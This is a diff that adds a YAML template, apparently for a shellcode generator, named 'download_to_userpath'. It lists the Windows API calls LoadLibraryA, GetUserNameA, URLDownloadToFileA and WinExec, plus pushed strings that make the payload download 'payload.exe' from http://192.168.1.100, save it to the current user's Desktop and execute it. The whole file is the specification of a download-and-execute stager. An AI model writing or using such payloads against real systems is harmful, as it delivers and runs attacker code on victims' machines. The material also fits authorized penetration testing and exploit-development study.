@@ -1,0 +1,32 @@
+# Download a file from URL and save to a user-specific path, then execute.
+# Resolves username at runtime with GetUserNameA.
+# Uses URLDownloadToFileA (urlmon.dll) for minimal code size.
+template: download_to_userpath
+badchars: []
+
+functions:
+  - LoadLibraryA
+  - GetUserNameA
+  - URLDownloadToFileA
+  - WinExec
+
+variables:
+  - username_len
+  - path_buf_ptr
+
+strings:
+  - label: advapi_dll
+    value: advapi32.dll
+    method: push
+  - label: urlmon_dll
+    value: urlmon.dll
+    method: push
+  - label: path_prefix
+    value: "C:\\Users\\"
+    method: push
+  - label: path_suffix
+    value: "\\Desktop\\payload.exe"
+    method: push
+  - label: url
+    value: "http://192.168.1.100/payload.exe"
+    method: push
